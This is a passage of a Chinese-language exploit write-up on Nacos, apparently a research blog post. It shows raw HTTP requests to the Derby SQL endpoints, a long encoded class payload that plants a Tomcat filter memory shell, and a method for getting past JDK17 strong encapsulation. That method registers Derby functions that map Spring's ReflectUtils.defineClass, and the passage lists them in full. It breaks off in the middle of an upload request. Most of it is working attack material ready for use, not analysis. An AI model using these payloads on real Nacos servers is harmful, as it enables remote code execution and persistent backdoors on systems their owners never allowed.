ViQXBwQ2xhc3NMb2FkZXIBACsoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAOZ2V0Q2xhc3NMb2FkZXIIANkBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHANsBAAlnZXRMb2FkZXIIAN0MANcA2AoAAgDfDAANAAoKAAIA4QEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAOMA5AoA3ADlDAAQAAoKAAIA5wEADGRlY29kZUJhc2U2NAEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMAOkA6goAAgDrAQAOZ3ppcERlY29tcHJlc3MBAAYoW0IpW0IMAO0A7goAAgDvAQALZGVmaW5lQ2xhc3MIAPEBAAJbQgcA8wEAEWphdmEvbGFuZy9JbnRlZ2VyBwD1AQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DAD3APgJAPYA%2BQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwA%2BwD8CgCwAP0BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAP8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwBAQECCgEAAQMBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwBBQEGCgD2AQcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAQkBCgoBAAELAQALbmV3SW5zdGFuY2UMAQ0AQwoAsAEOAQANZmluZEZpbHRlckRlZggBEAwA2QCoCgCwARIBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlckRlZggBFAEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyTWFwCAEWAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyRGVmCAEYAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyTWFwCAEaAQANc2V0RmlsdGVyTmFtZQgBHAEADnNldEZpbHRlckNsYXNzCAEeAQAMYWRkRmlsdGVyRGVmCAEgAQANYWRkVVJMUGF0dGVybggBIgEADXNldFVSTFBhdHRlcm4IASQBAA5maW5kRmlsdGVyTWFwcwgBJgEAE1tMamF2YS9sYW5nL09iamVjdDsHASgBABdqYXZhL2xhbmcvcmVmbGVjdC9BcnJheQcBKgEAJihMamF2YS9sYW5nL0NsYXNzO0kpTGphdmEvbGFuZy9PYmplY3Q7DAENASwKASsBLQEACWFycmF5Y29weQEAKihMamF2YS9sYW5nL09iamVjdDtJTGphdmEvbGFuZy9PYmplY3Q7SUkpVgwBLwEwCgBhATEBAApmaWx0ZXJNYXBzCAEzAQANc2V0RmllbGRWYWx1ZQEAOShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgwBNQE2CgACATcBAAVhcnJheQgBOQEAMG9yZy5hcGFjaGUuY2F0YWxpbmEuY29yZS5BcHBsaWNhdGlvbkZpbHRlckNvbmZpZwgBOwEAF2dldERlY2xhcmVkQ29uc3RydWN0b3JzAQAiKClbTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwwBPQE%2BCgCwAT8BAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgcBQQoBQgEDAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAENAUQKAUIBRQEADWZpbHRlckNvbmZpZ3MIAUcBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBSQFKCwBzAUsBABBqYXZhLnV0aWwuQmFzZTY0CAFNAQAHZm9yTmFtZQwBTwDkCgCwAVABAApnZXREZWNvZGVyCAFSAQAJZ2V0TWV0aG9kDAFUAPwKALABVQEABmRlY29kZQgBVwEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIAVkBAAxkZWNvZGVCdWZmZXIIAVsBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwFdAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAV8KAWAAFwEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwFiAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBZAEABShbQilWDAATAWYKAWUBZwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwAEwFpCgFjAWoBAARyZWFkAQAFKFtCKUkMAWwBbQoBYwFuAQAFd3JpdGUBAAcoW0JJSSlWDAFwAXEKAWABcgEAC3RvQnl0ZUFycmF5AQAEKClbQgwBdAF1CgFgAXYBAAVjbG9zZQwBeAAUCgFjAXkKAWABeQEAYChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczwqPjtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HAX0BAA1nZXRTdXBlcmNsYXNzDAF%2FAKwKALABgAEAEk1ldGhvZCBub3QgZm91bmQ6IAgBggEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAEwGECgF%2BAYUBABJbTGphdmEvbGFuZy9DbGFzczsHAYcBAAhnZXRGaWVsZAEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcBiwEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwGNAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBjwGQCgCwAZEBABIgRmllbGQgbm90IGZvdW5kOiAIAZMKAYwBhQwBiQGKCgACAZYBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBmAoBmQEDAQADZ2V0DAGbAE8KAZkBnAEAA3NldAwBngBTCgGZAZ8BABNqYXZhL2lvL1ByaW50U3RyZWFtBwGhAQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgwAEwGjCgGiAaQBAA9wcmludFN0YWNrVHJhY2UBABgoTGphdmEvaW8vUHJpbnRTdHJlYW07KVYMAaYBpwoAFgGoCgFgAC8KAaIBeQEACDxjbGluaXQ%2BAQAACAGtCgACABcBAARDb2RlAQANU3RhY2tNYXBUYWJsZQEACkV4Y2VwdGlvbnMBAAlTaWduYXR1cmUAIQACAAQAAAACAAoABQAGAAAACgAHAAgAAAASAAEACQAKAAEBsAAAAA8AAQABAAAAAxIMsAAAAAAAAQANAAoAAQGwAAAADwABAAEAAAADEg%2BwAAAAAAABABAACgABAbAAAAAPAAEAAQAAAAMSErAAAAAAAAEAEwAUAAEBsAAAAW0AAwAFAAABByq3ABiyABqZAASxAUwqtgAeTKcAJE27ACBZtwAhsgAjtgAnEim2ACcqLLcALbYAJ7YAMLMAIyvGAAwruQA2AQCZAB67ACBZtwAhsgAjtgAnEji2ACe2ADCzACOnAJ8ruQA8AQBNLLkAQQEAmQCPLLkARQEATrsAIFm3ACGyACO2ACcSR7YAJyottwBLtgAnEk22ACe2ADCzACMqLbcAUToEKi0ZBLYAVbsAIFm3ACGyACO2ACcSV7YAJyq2AFm2ACcSW7YAJ7YAMLMAI6cAKzoEuwAgWbcAIbIAI7YAJxJdtgAnKhkEtwAttgAnEl%2B2ACe2ADCzACOn%2F24EswAasgBlsgAjV1exAAIADQASABUAFgB1AMwAzwAWAAEBsQAAAEQACf8ACwABBwACAAD%2FAAkAAgcAAgcAMgABBwAWIAwa%2FAAGBwA%2B%2FwBpAAQHAAIHADIHAD4HAAQAAQcAFvwAJwcABPgAAgABABsAHAADAbAAAAIVAAIADAAAAYG7AGpZtwBrTLgAcbkAdgEATSy5ADwBAE4tuQBBAQCZAWEtuQBFAQDAAG06BBkEtgB5OgUZBRJ7tgCBmQBaGQQSg7gAhxKJuACHEou4AIfAAHM6BhkGuQCPAQC5AJIBADoHGQe5AEEBAJkAKRkHuQBFAQA6CBkIEou4AIfAAHM6CSsZCbkAjwEAuQCWAgBXp%2F%2FTpwDrGQUSmLYAgZkAjxkFEpq2AIGaAIUZBBKDuACHEom4AIcSnLgAhxKeuACHOgYZBhKguACHEqK4AIcSpLgAhxKmuACHOgcZBxKLuACHwABzOggZCLkAjwEAuQCSAQA6CRkJuQBBAQCZACkZCbkARQEAOgoZChKLuACHwABzOgsrGQu5AI8BALkAlgIAV6f%2F06cAWjoGpwBVGQS2AKrGAE0ZBLYAqrYArrYAszoGGQYStbYAuZkANhkEtgCqEru4AIc6BxkHxgAlGQe2AK62ALwSvrYAwZkAFRkHEsO4AIc6CCsZCLkAxwIAV6f%2BnCuwAAEAqAEiASUAaAABAbEAAAB6AAr%2BABgHAGoHADIHAD7%2FAEgACAcAAgcAagcAMgcAPgcAbQcAfQcAcwcAPgAAL%2FkAAv8AXQAKBwACBwBqBwAyBwA%2BBwBtBwB9BwAEBwAEBwBzBwA%2BAAAv%2FwACAAYHAAIHAGoHADIHAD4HAG0HAH0AAQcAaAT7AFH5AAIBsgAAAAQAAQBoAbMAAAACAGYAAgBIAEkAAQGwAAAAlgAEAAQAAABfAU0rEskBAbgAzRLPAQG4AM3AAH1NpwAETiu2AK62ALxOLMcABS2wLLYA0JkAF7sAIFm3ACEttgAnEtK2ACe2ADCwuwAgWbcAIS22ACcS1LYAJyy2ACcS1rYAJ7YAMLAAAQACABUAGABoAAEBsQAAAB0ABP8AGAADBwACBwAEBwB9AAEHAGgA%2FAANBwB9GgACANcA2AACAbAAAABCAAQABAAAACIrEtoBAbgAzcAA3LBNKxLeAQG4AM1OLRLaAQG4AM3AANywAAEAAAALAAwAaAABAbEAAAAGAAFMBwBoAbIAAAAEAAEAaAACAE4ATwACAbAAAADKAAYABwAAAJUqK7cA4E0BTiwqtgDitgDmTqcAWDoEKrYA6LgA7LgA8DoFEtwS8ga9ALBZAxL0U1kEsgD6U1kFsgD6U7YA%2FjoGGQYEtgEEGQYsBr0ABFkDGQVTWQQDuAEIU1kFGQW%2BuAEIU7YBDMAAsE67ACBZtwAhsgAjtgAnEle2ACcstgCutgC8tgAnEk22ACe2ADCzACMttgEPsAABAAgAEQAUAGgAAQGxAAAAGwAC%2FwAUAAQHAAIHAAQHANwHALAAAQcAaPsAVAGyAAAABAABAGgAAQBSAFMAAgGwAAACaQAHAA0AAAHMKxMBEQS9ALBZAxJ9UwS9AARZAyq2AOJTuADNxgAEsSu2AK62ARM6BhkGEwEVtgDmtgEPThkGEwEXtgDmOgUZBbYBDzoEpwAiOgcZBhMBGbYA5rYBD04ZBhMBG7YA5joFGQW2AQ86BC0TAR0EvQCwWQMSfVMEvQAEWQMqtgDiU7gAzVctEwEfBL0AsFkDEn1TBL0ABFkDKrYA4lO4AM1XpwAhOgctEwEfBL0AsFkDErBTBL0ABFkDLLYArlO4AM1XKxMBIQS9ALBZAy22AK5TBL0ABFkDLVO4AM1XGQQTAR0EvQCwWQMSfVMEvQAEWQMqtgDiU7gAzVcZBBMBIwS9ALBZAxJ9UwS9AARZAyq2AFlTuADNV6cAIjoIGQQTASUEvQCwWQMSfVMEvQAEWQMqtgBZU7gAzVcrEwEnAQG4AM3AASnAASk6CBkFGQi%2BBGC4AS7AASnAASk6CRkJAxkEUxkIAxkJBBkIvrgBMisTATQZCbgBOKcAFDoKKxMBNLgAhxMBOhkJuAE4GQYTATy2AOa2AUADMjoKGQoEtgFDGQoFvQAEWQMrU1kELVO2AUY6CysTAUi4AIfAAHM6DBkMKrYA4hkLuQFMAwBXsQAEACgARQBIAGgAgwCfAKIAaAD4ARUBGABoAWwBdQF4AGgAAQGxAAAAawAJH%2F8AKAAHBwACBwAEBwAEAAAABwDcAAEHAGj%2FAB4ABwcAAgcABAcABAcABAcABAcAsAcA3AAAegcAaB33AFcHAGge%2FwBAAAoHAAIHAAQHAAQHAAQHAAQHALAHANwABwEpBwEpAAEHAGgQAbIAAAAEAAEAaAABAC4ACgABAbAAAAAQAAEAAQAAAASyACOwAAAAAAAJAOkA6gACAbAAAACRAAYAAwAAAG8TAU64AVFMKxMBUwO9ALC2AVYBA70ABLYBDE0stgCuEwFYBL0AsFkDEn1TtgFWLAS9AARZAypTtgEMwAD0wAD0sE0TAVq4AVFMKxMBXAS9ALBZAxJ9U7YBViu2AQ8EvQAEWQMqU7YBDMAA9MAA9LAAAQAAAEAAQQBoAAEBsQAAAAgAAfcAQQcAaAGyAAAABAABAGgACQDtAO4AAgGwAAAAvwAFAAcAAABcuwFgWbcBYUwBTbsBY1m7AWVZKrcBaLcBa00REAC8CE4sLbYBb1k2BJ4ADistAxUEtgFzp%2F%2FtK7YBdzoFLMYAByy2AXortgF7GQWwOgYsxgAHLLYBeiu2AXsZBr8AAgAKADwASwAAAEsATQBLAAAAAQGxAAAAQQAF%2FgAgBwFgBwFjBwD0%2FAAVAfwADQcA9P8ABgADBwD0BwFgBwFjAAEHABb%2FAAkABwcA9AcBYAcBYwAAAAcAFgAAAbIAAAAEAAEBXgAJAMoAywADAbAAAADbAAQABwAAAIYqwQCwmQAKKsAAsKcAByq2AK46BAE6BRkExgAzGQXHAC4sxwASGQQrA70AsLYA%2FjoFpwAMGQQrLLYA%2FjoFp%2F%2FaOgYZBLYBgToEp%2F%2FOGQXHAB%2B7AX5ZuwAgWbcAIRMBg7YAJyu2ACe2ADC3AYa%2FGQUEtgEEGQUqwQCwmQAHAacABCottgEMsAABACEAPQBAAX4AAQGxAAAAOwAKDkMHALD9AAQHALAHAQAcCEIHAX4LIFIHAQD%2FAAAABgcABAcAfQcBiAcBKQcAsAcBAAACBwEABwAEAbIAAAAEAAEAaAGzAAAAAgF8AAkBiQGKAAIBsAAAAGcABAAEAAAAQCq2AK5NLBIEpQASLCu2AZKwTiy2AYFNp%2F%2FuuwGMWbsAIFm3ACEqtgCutgC8tgAnEwGUtgAnK7YAJ7YAMLcBlb8AAQALABAAEQGMAAEBsQAAAA0AA%2FwABQcAsEsHAYwIAbIAAAAGAAIBjAGOAAkAhACFAAIBsAAAAB0AAgADAAAAESoruAGXTSwEtgGaLCq2AZ2wAAAAAAGyAAAABgACAYwBjgAJATUBNgACAbAAAAAeAAMABAAAABIqK7gBl04tBLYBmi0qLLYBoLEAAAAAAbIAAAAEAAEAaAACACoAKwABAbAAAACBAAMABgAAADYBTbsBYFm3AWFOuwGiWS23AaVNKyy2AakttgGqOgQsxgAHLLYBqxkEsDoFLMYAByy2AasZBb8AAgACAB4AKQAAACkAKwApAAAAAQGxAAAAKQAD%2FgAmBwGiBwFgBwB9%2FwACAAMHAAIHABYHAaIAAQcAFv4ACQAABwAWAAgBrAAUAAEBsAAAADYAAgAAAAAAH6cAEQATAa6zACMDswAapwAHAKf%2F8QC7AAJZtwGvV7EAAAABAbEAAAAFAAMDDQMAAA%3D%3D%27%29%2C+K%28%29%29+as+a+from+config_info+%2F%2Alimit%2A%2F HTTP/1.1
Host: 127.0.0.1:8848
Sec-Fetch-Mode: navigate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Sec-Fetch-Site: same-origin
sec-ch-ua-mobile: ?0
If-Modified-Since: Wed, 03 Apr 2024 06:25:07 GMT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "macOS"
Sec-Fetch-User: ?1
Cookie: lang=zh-CN; flavor_uv=1; grafana_session=0819560c9c23861c1372c45faded2e95; XSRF-TOKEN=60076405-84b6-42e3-b669-aaada2d50fc8; JSESSIONID=A346858F7C26752E1DC85C37A3276B40; java-chains-token-key=admin_token
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"
Accept-Encoding: gzip, deflate, br, zstd


```

![](assets/002.png)

```http
GET /nacos/v1/cs/ops/derby?sql=select+count%28%2A%29+as+b%2C+N%28%27org.springframework.boot.loader.FileSerializerfa4738ba997949f4893f7031f900437d%27%2C+true%2C+K%28%29%29+as+a+from+config_info+%2F%2Alimit%2A%2F HTTP/1.1
Host: 127.0.0.1:8848
Sec-Fetch-Mode: navigate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Sec-Fetch-Site: same-origin
sec-ch-ua-mobile: ?0
If-Modified-Since: Wed, 03 Apr 2024 06:25:07 GMT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "macOS"
Sec-Fetch-User: ?1
Cookie: lang=zh-CN; flavor_uv=1; grafana_session=0819560c9c23861c1372c45faded2e95; XSRF-TOKEN=60076405-84b6-42e3-b669-aaada2d50fc8; JSESSIONID=A346858F7C26752E1DC85C37A3276B40; java-chains-token-key=admin_token
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"
Accept-Encoding: gzip, deflate, br, zstd


```

![](assets/003.png)
## JDK17 强封装绕过

把同样的语句放到 JDK17 环境的 Nacos 上执行时，调用三参数的 `ReflectUtils.defineClass` 会直接报错

```text
org.springframework.cglib.core.CodeGenerationException: java.lang.reflect.InaccessibleObjectException-->Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain) throws java.lang.ClassFormatError accessible: module java.base does not "opens java.lang" to unnamed module
```

如果在 Nacos 2.0.4 这类使用 Spring 5.2.x 的版本上，报错信息还会变成 `Cannot invoke "Object.getClass()" because "cause" is null`，众所周知，这是因为 JDK17 默认强封装机制。

而在 Derby 的 `CREATE FUNCTION ... EXTERNAL NAME` 中，只允许绑定 `public static` 方法，像 `MethodHandles.Lookup#defineClass`、`Unsafe#defineAnonymousClass` 或 `Unsafe#putObject` 这些全都是实例方法，无法在 SQL 里直接映射成函数调用。

要解决这个问题，我们来看 Nacos 2.3.2 自带的 `spring-core-5.3.31.jar` 中 `org.springframework.cglib.core.ReflectUtils` 的完整实现

```java
// spring-core-5.3.31/org/springframework/cglib/core/ReflectUtils.java
static {
    Method privateLookupIn;
    Method lookupDefineClass;
    Method classLoaderDefineClass;
    Throwable throwable = null;
    try {
        privateLookupIn = (Method) AccessController.doPrivileged(new PrivilegedExceptionAction() {
            public Object run() throws Exception {
                try {
                    return MethodHandles.class.getMethod("privateLookupIn", Class.class, MethodHandles.Lookup.class);
                }
                catch (NoSuchMethodException ex) {
                    return null;
                }
            }
        });
        lookupDefineClass = (Method) AccessController.doPrivileged(new PrivilegedExceptionAction() {
            public Object run() throws Exception {
                try {
                    return MethodHandles.Lookup.class.getMethod("defineClass", byte[].class);
                }
                catch (NoSuchMethodException ex) {
                    return null;
                }
            }
        });
        classLoaderDefineClass = (Method) AccessController.doPrivileged(new PrivilegedExceptionAction() {
            public Object run() throws Exception {
                return ClassLoader.class.getDeclaredMethod("defineClass",
                        String.class, byte[].class, Integer.TYPE, Integer.TYPE, ProtectionDomain.class);
            }
        });
    }
    catch (Throwable t) {
        privateLookupIn = null;
        lookupDefineClass = null;
        classLoaderDefineClass = null;
        throwable = t;
    }

    privateLookupInMethod = privateLookupIn;
    lookupDefineClassMethod = lookupDefineClass;
    classLoaderDefineClassMethod = classLoaderDefineClass;
    THROWABLE = throwable;
    PROTECTION_DOMAIN = getProtectionDomain(ReflectUtils.class);

    AccessController.doPrivileged(new PrivilegedAction() {
        public Object run() {
            Method[] methods = Object.class.getDeclaredMethods();
            for (Method method : methods) {
                if ("finalize".equals(method.getName())
                        || (method.getModifiers() & (Modifier.FINAL | Modifier.STATIC)) > 0) {
                    continue;
                }
                OBJECT_METHODS.add(method);
            }
            return null;
        }
    });
}

public static Class defineClass(String className, byte[] b, ClassLoader loader) throws Exception {
    return defineClass(className, b, loader, null, null);
}

public static Class defineClass(String className, byte[] b, ClassLoader loader,
        ProtectionDomain protectionDomain) throws Exception {

    return defineClass(className, b, loader, protectionDomain, null);
}

@SuppressWarnings({"deprecation", "serial"})
public static Class defineClass(String className, byte[] b, ClassLoader loader,
        ProtectionDomain protectionDomain, Class<?> contextClass) throws Exception {

    Class c = null;
    Throwable t = THROWABLE;

    // Preferred option: JDK 9+ Lookup.defineClass API if ClassLoader matches
    if (contextClass != null && contextClass.getClassLoader() == loader &&
            privateLookupInMethod != null && lookupDefineClassMethod != null) {
        try {
            MethodHandles.Lookup lookup = (MethodHandles.Lookup)
                    privateLookupInMethod.invoke(null, contextClass, MethodHandles.lookup());
            c = (Class) lookupDefineClassMethod.invoke(lookup, b);
        }
        catch (InvocationTargetException ex) {
            Throwable target = ex.getTargetException();
            if (target.getClass() != LinkageError.class && target.getClass() != IllegalArgumentException.class) {
                throw new CodeGenerationException(target);
            }
            // in case of plain LinkageError (class already defined)
            // or IllegalArgumentException (class in different package):
            // fall through to traditional ClassLoader.defineClass below
            t = target;
        }
        catch (Throwable ex) {
            throw new CodeGenerationException(ex);
        }
    }

    // Direct defineClass attempt on the target Classloader
    if (c == null) {
        if (protectionDomain == null) {
            protectionDomain = PROTECTION_DOMAIN;
        }

        // Look for publicDefineClass(String name, byte[] b, ProtectionDomain protectionDomain)
        try {
            Method publicDefineClass = loader.getClass().getMethod(
                    "publicDefineClass", String.class, byte[].class, ProtectionDomain.class);
            c = (Class) publicDefineClass.invoke(loader, className, b, protectionDomain);
        }
        catch (InvocationTargetException ex) {
            if (!(ex.getTargetException() instanceof UnsupportedOperationException)) {
                throw new CodeGenerationException(ex.getTargetException());
            }
            // in case of UnsupportedOperationException, fall through
            t = ex.getTargetException();
        }
        catch (Throwable ex) {
            // publicDefineClass method not available -> fall through
            t = ex;
        }

        // Classic option: protected ClassLoader.defineClass method
        if (c == null && classLoaderDefineClassMethod != null) {
            Object[] args = new Object[]{className, b, 0, b.length, protectionDomain};
            try {
                if (!classLoaderDefineClassMethod.isAccessible()) {
                    classLoaderDefineClassMethod.setAccessible(true);
                }
                c = (Class) classLoaderDefineClassMethod.invoke(loader, args);
            }
            catch (InvocationTargetException ex) {
                throw new CodeGenerationException(ex.getTargetException());
            }
            catch (Throwable ex) {
                // Fall through if setAccessible fails with InaccessibleObjectException on JDK 9+
                // (on the module path and/or with a JVM bootstrapped with --illegal-access=deny)
                if (!ex.getClass().getName().endsWith("InaccessibleObjectException")) {
                    throw new CodeGenerationException(ex);
                }
                t = ex;
            }
        }
    }

    // Fallback option: JDK 9+ Lookup.defineClass API even if ClassLoader does not match
    if (c == null && contextClass != null && contextClass.getClassLoader() != loader &&
            privateLookupInMethod != null && lookupDefineClassMethod != null) {
        try {
            MethodHandles.Lookup lookup = (MethodHandles.Lookup)
                    privateLookupInMethod.invoke(null, contextClass, MethodHandles.lookup());
            c = (Class) lookupDefineClassMethod.invoke(lookup, b);
        }
        catch (InvocationTargetException ex) {
            Throwable target = ex.getTargetException();
            if (target.getClass() != LinkageError.class && target.getClass() != IllegalAccessException.class) {
                throw new CodeGenerationException(target);
            }
            throw new CodeGenerationException(target) {
                @Override
                public String getMessage() {
                    return "ClassLoader mismatch for [" + contextClass.getName() +
                            "]: JVM should be started with --add-opens=java.base/java.lang=ALL-UNNAMED " +
                            "for ClassLoader.defineClass to be accessible on " + loader.getClass().getName() +
                            "; consider co-locating the affected class in that target ClassLoader instead.";
                }
            };
        }
        catch (Throwable ex) {
            throw new CodeGenerationException(ex);
        }
    }

    // No defineClass variant available at all?
    if (c == null) {
        throw new CodeGenerationException(t);
    }

    // Force static initializers to run.
    Class.forName(className, true, loader);
    return c;
}
```

可以看到三参数的 `defineClass(String, byte[], ClassLoader)` 内部其实是把 `protectionDomain` 和 `contextClass` 都传了 `null`，然后去调五参数的重载，所以必然会掉进中间反射 `ClassLoader.defineClass` 的分支，在 JDK17 下触发 `InaccessibleObjectException`。

但如果我们直接映射五参数的 `ReflectUtils.defineClass(String, byte[], ClassLoader, ProtectionDomain, Class)`，并且传入非空的 `contextClass`，它就会走最上面的第一个分支

```java
MethodHandles.Lookup lookup = (MethodHandles.Lookup)
        privateLookupInMethod.invoke(null, contextClass, MethodHandles.lookup());
c = (Class) lookupDefineClassMethod.invoke(lookup, b);
```

`MethodHandles.privateLookupIn` 和 `Lookup.defineClass` 是 JDK 9+ 官方提供的标准公开 API（`public` 方法），用来在不打破模块封装的前提下向指定上下文所在的包动态定义类。只要满足两个条件，就能完全避开 `ClassLoader.defineClass` 的反射限制

1. `contextClass.getClassLoader() == loader`，即传入的 `contextClass` 的类加载器必须和第三个参数 `loader` 一致；
2. 待加载字节码的类名所在的包（package），必须与 `contextClass` 所在的包完全相同，否则 `Lookup.defineClass` 会抛 `IllegalArgumentException`（提示不同包）。

在 Nacos 的单机 jar 包中，`org.springframework.boot.loader.Launcher` 位于 fat jar 根目录，由系统类加载器 `AppClassLoader` 加载，通过单参数的 `Class.forName('org.springframework.boot.loader.Launcher')` 就能直接拿到。于是我们可以这样配合

- 将 `g()` 绑定为 `ClassLoader.getSystemClassLoader()`，返回 `AppClassLoader`；
- 将 `contextClass` 设为 `n('org.springframework.boot.loader.Launcher')`，它的类加载器同样是 `AppClassLoader`，满足 `contextClass.getClassLoader() == loader`；
- 在生成内存马注入器字节码时，把注入器的类名指定为同包下的 `org.springframework.boot.loader.xxxx`；
- 第四个参数 `ProtectionDomain` 直接传 `null`。

另外，因为注入器本身在往 Tomcat 注册内存马时，内部还需要把 Filter Shell 的字节码 define 进内存，如果注入器自己直接反射 `ClassLoader.defineClass` 同样会被 JDK17 拦住。所以生成 payload 时选择使用 **MemShellParty** 并勾选 `byPassJavaModule`，并且将注入器类名设为 `org.springframework.boot.loader.xxxx`。

因此，JDK17 下先通过 `/v1/cs/ops/data/removal` 竞争注册如下类型与函数

```sql
create type C external name 'java.lang.Class' language java
create type L external name 'java.lang.ClassLoader' language java
create type P external name 'java.security.ProtectionDomain' language java
create function d(s varchar(32672)) returns varchar(32672) for bit data external name 'org.springframework.util.Base64Utils.decodeFromString' language java parameter style java
create function g() returns L external name 'java.lang.ClassLoader.getSystemClassLoader' language java parameter style java
create function n(s varchar(2000)) returns C external name 'java.lang.Class.forName' language java parameter style java
create function f(a varchar(32672), b varchar(32672) for bit data, x L, y P, z C) returns C external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String,byte[],java.lang.ClassLoader,java.security.ProtectionDomain,java.lang.Class)' language java parameter style java
```

注册完成后，同样直接通过 `/v1/cs/ops/derby` 发送 GET 请求无竞争加载字节码，执行的 SQL 语句原型如下

```sql
select count(*) as b,f('org.springframework.boot.loader.xxxx',d('MemShellParty生成的字节码'),g(),null,n('org.springframework.boot.loader.Launcher')) as a from config_info /*limit*/

select count(*) as b, n('org.springframework.boot.loader.xxxx') as a from config_info /*limit*/
```

实测如下

```http
POST /nacos/v1/cs/ops/data/removal HTTP/1.1
Host: 127.0.0.1:8849
Sec-Fetch-Mode: navigate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Sec-Fetch-Site: same-origin
sec-ch-ua-mobile: ?0
If-Modified-Since: Wed, 03 Apr 2024 06:25:07 GMT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "macOS"
Sec-Fetch-User: ?1
Cookie: lang=zh-CN; flavor_uv=1; grafana_session=0819560c9c23861c1372c45faded2e95; XSRF-TOKEN=60076405-84b6-42e3-b669-aaada2d50fc8; JSESSIONID=A346858F7C26752E1DC85C37A3276B40; java-chains-token-key=admin_token
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydGQWXb3jKyayCIGQ
Content-Length: 141{{repeat(88)}}

------WebKitFormBoundarydGQWXb3jKyayCIGQ
Content-Disposition: form-data; name="file"; filename="x.sql"

create type c external name 'java.lang.Class' language java
create type l external name 'java.lang.ClassLoader' language java
create type p external name 'java.security.ProtectionDomain' language java
create function d(s varchar(32672)) returns varchar(32672) for bit data external name 'org.springframework.util.Base64Utils.decodeFromString' language java parameter style java
create function g() returns l external name 'java.lang.ClassLoader.getSystemClassLoader' language java parameter style java
